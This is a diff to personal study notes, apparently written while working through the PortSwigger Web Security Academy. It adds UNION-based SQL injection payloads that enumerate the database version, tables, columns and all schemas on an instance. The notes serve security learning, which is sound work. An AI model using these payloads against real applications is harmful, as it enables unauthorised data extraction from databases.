@@ -47,11 +47,15 @@ This document started as my notes while progressing through PortSwigger Web Secu
 
 * See cheat sheet for DB-specific queries
 * DB version enumeration
-  * `' UNION SELECT version(),NULL--`
+  * `' UNION SELECT version(),database()--`
 * List tables
   * `' UNION SELECT table_name,NULL from information_schema.tables--`
+  * `' UNION SELECT table_name,NULL from information_schema.tables WHERE table_schema=database()--`
 * List columns
   * `' UNION SELECT column_name,NULL from information_schema.columns where table_name='name'--`
+* List all databases on instance:
+  * `SHOW DATABASES;`
+  * ` UNION SELECT DISTINCT table_schema from information_schema.tables--`
 
 ### Blind SQL Injection
 
